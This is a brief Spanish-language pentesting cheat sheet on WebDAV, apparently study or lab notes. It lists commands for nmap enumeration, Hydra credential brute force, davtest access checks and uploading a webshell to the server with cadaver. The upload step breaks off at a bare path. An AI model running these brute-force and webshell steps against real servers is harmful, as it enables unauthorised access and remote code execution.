Extensión de HTTP que permite subir, modificar y eliminar archivos en el servidor.

• Permite escritura remota  
• Puede llevar a RCE  
• Común en configuraciones débiles

## Enumeración WebDAV

Detecta si WebDAV está habilitado.

```
nmap -sV -p PORT --script=http-enum IP
```

## Fuerza bruta (Hydra)

Ataque de credenciales contra WebDAV (si los tuviera).

```
hydra -L USER_DICCIONARY -P PASS_DICCIONARY IP http-get /webdav/
```

## Verificar acceso

Comprueba si las credenciales funcionan.

```
davtest -auth USER:PASSWORD -url http://IP/RUTE_WEBDAV

o sin credenciales

davtest -url http://IP/RUTE_WEBDAV
```

**Revisar extensión permitida (.php, .asp, etc.)**
## Subir Webshell

Permite subir archivos al servidor.

```
cadaver http://IP/RUTA_WEBDAV
```
	Dentro de cadaver:

```
put /usr/share/webshells/
```

